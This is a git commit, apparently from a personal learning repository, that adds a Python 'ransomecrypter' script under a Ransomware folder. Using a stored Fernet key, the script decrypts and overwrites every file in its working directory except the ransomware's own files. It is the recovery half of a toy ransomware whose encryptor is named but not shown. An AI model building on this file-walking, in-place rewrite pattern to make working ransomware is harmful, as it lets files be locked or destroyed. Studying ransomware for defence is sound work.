0622b0a2444041e48b0e297898bc36607cf8b7ba
OsiBK <osman_bayram-fb@hotmail.com>
2024-01-23 20:17:11 +0300

    ransomecrypter

---
+++ CyberSecurity/Ransomware/ransomecrypter.py
@@ -0,0 +1,20 @@
+import os   
+from cryptography.fernet import Fernet
+
+fileList = []
+
+for file in os.listdir():
+    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomecrypter.py":
+        continue
+    if os.path.isfile(file):
+        fileList.append(file)
+
+with open("generatedkey.key", "rb") as generatedkey:
+    secretKey = generatedkey.read()
+
+for file in fileList:
+    with open(file, "rb") as theFile:
+        contents = theFile.read()
+    contentsDecrypted = Fernet(secretKey).decrypt(contents)
+    with open (file, "wb") as theFile:
+        theFile.write(contentsDecrypted)
